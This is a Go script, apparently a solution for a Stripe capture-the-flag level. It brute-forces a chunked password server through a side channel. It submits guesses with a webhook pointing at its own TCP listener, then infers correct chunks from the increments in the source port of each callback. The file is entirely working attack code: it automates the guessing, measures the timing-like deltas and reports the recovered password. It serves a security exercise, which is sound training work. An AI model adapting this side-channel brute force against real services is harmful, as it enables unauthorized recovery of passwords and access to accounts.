package main

import (
    "os"
    "fmt"
    "net"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
    "encoding/json"
)

const (
    MY_HOSTNAME = "0.0.0.0"
    ATTACK_URL = "https://level08-2.stripe-ctf.com/user-emjzrngbdj/"
    BASE_INTERVAL = 2.0
)

func get_json(client * http.Client, url string, post_data string) (response map[string]bool, header http.Header) {
    var f map[string]bool
    b, h := post_url(client, url, post_data)
    json.Unmarshal(b, &f)
    return f, h
}

func get_html(client * http.Client, url string) (response string) {
    resp := get_url(client, url)
    return string(resp)
}

func get_url(client * http.Client, url string) (response []byte) {
    resp, err :=  client.Get(url)
    if err != nil {
            // handle error
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    return body
}

func post_url(client * http.Client, url string, post_data string) (response []byte, header http.Header) {
    resp, err :=  client.Post(url, "application/x-www-form-urlencoded", strings.NewReader(post_data))
    if err != nil {
            // handle error
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    return body, resp.Header
}

func start_listner(ports chan<- int) (ip string, port int){
    ln, err := net.ListenTCP("tcp", &net.TCPAddr{net.ParseIP("0.0.0.0"), 0})
    if err != nil {
            // handle error
    }
    go func(ln * net.TCPListener, ports chan<- int) {
        for {
            conn, err := ln.Accept()
            if err != nil {
                // handle error
                continue
            }
            go func (conn net.Conn, ports chan<- int) {
                fmt.Fprintf(conn, "HTTP/1.0 200 OK\n")
                fmt.Fprintf(conn, "Content-Type: text/html\n")
                fmt.Fprintf(conn, "Connection: close\n\n")
                fmt.Fprintf(conn, "%s\r\n", conn.RemoteAddr())
                port, err := strconv.Atoi(strings.Split(conn.RemoteAddr().String(), ":")[1])
                if err != nil {}
                ports <- port
                conn.Close()
            }(conn, ports)
        }
    }(ln, ports)

    addr := ln.Addr().(* net.TCPAddr)

    return addr.IP.String(), addr.Port
}

func lpad(s string) (string) {
    ret := ""
    max := 3 - len(s)
    for i := 0; i < max; i++ {
        ret += "0"
    }
    return ret + s
}

func make_guess(prefix string, suffix string) (string) {
    ret := prefix + suffix
    max := len(ret)
    for i := 0; i < 12 - max; i++ {
        ret += "X"
    }
    return ret
}

func main() {

    ports := make(chan int)
    done := make(chan bool)

    args := os.Args
    var  attack_url string
    if len(args) == 2 {
        attack_url = args[1]
    } else {
        attack_url = ATTACK_URL
    }

    fmt.Printf("Hacking endpoint :%s\n", attack_url)

    tr := &http.Transport{
    }
    client := &http.Client{Transport: tr}

    ip, port := start_listner(ports)
    if (ip == ip) {
    }
    webhook_url := MY_HOSTNAME + ":" + strconv.Itoa(port)

    fmt.Printf("Starting listen server on :%d\n", port)

    go func(attack_url string, webhook_url string, ports <-chan int, done chan<- bool) {

        known_pass := ""
        last_port := 0
        delta := 0.0
        thresh := 5.0
        guessn := 0
        freak_mode := false
        current_interval := BASE_INTERVAL

        for {
            consecutives := 0.0
            running_total := 0.0

            g := lpad(strconv.Itoa(guessn))
            guess := make_guess(known_pass, g)

            for {

                fmt.Printf("Guessing :%q, %q\n", guess, freak_mode)
                map_response, header := get_json(client, attack_url, `{"password": "` + guess + `", "webhooks": ["` + webhook_url + `"]}`)

                if header == nil {}

                if map_response["success"] {
                    fmt.Printf("Answer is :%q\n", guess)
                    done <- true
                }
                port := <-ports

                if freak_mode {
                    fmt.Printf("freak_mode, next\n")
                    break
                }

                delta = float64(port - last_port)
                delta_a := delta - current_interval

                last_port = port
                fmt.Printf("Delta %q\n", delta)
                if consecutives == thresh {
                    avg := running_total / float64(thresh)
                    fmt.Printf("After 5 consecutives %q, avg %f\n", guess, avg)

                    if avg > 0.6 {
                        fmt.Printf("Found next chunk %d\n", g)
                        known_pass += g
                        if len(known_pass) == 9 {
                            freak_mode = true
                        }
                        guessn = -1
                        current_interval += 1
                    }
                    break
                } else if delta_a > 1.0 || delta_a < 0.0 {
                    fmt.Printf("Delta weird, continuing\n")
                    continue
                } else if delta == current_interval && consecutives == 0.0 {
                    break
                } else {
                    fmt.Printf("Recording delta: %i\n", delta_a)
                    running_total += delta_a
                    consecutives++
                    continue
                }
            }
            guessn++
        }
    }(attack_url, webhook_url, ports, done)

    <- done
}
